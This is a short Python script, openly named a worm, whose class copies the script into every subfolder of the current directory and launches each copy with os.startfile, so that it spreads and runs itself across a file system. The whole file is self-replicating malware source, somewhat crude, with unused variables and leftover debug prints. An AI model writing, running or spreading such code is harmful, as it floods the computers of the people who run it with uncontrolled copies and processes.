import os
import shutil
import time
import subprocess
import sys
launched=[]
file_name=os.sep+"1.exe"
class Worm:

    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path

        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list

        if isinstance(target_dir_list, type(None)):
            self.iteration = 2
        else:
            self.iteration = iteration

        # get own absolute path
        self.own_path = os.path.realpath(__file__)


    def list_directories(self,path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        list_subfolders_with_paths = [f.path for f in os.scandir(current_directory) if f.is_dir()]
        copied_script_name = os.path.basename(__file__)
        for xoyu in list_subfolders_with_paths:
            shutil.copy(__file__, xoyu + os.sep + copied_script_name)
            print(copied_script_name)
            run_name=xoyu + os.sep + copied_script_name
            if "py" in copied_script_name:
                os.startfile(run_name)
            else:
                print("h")






    def start_actions(self):
        self.list_directories(self.path)



xbnumba=1

if xbnumba==1:
    current_directory = os.path.abspath("")
    worm = Worm(path=current_directory)
    worm.start_actions()
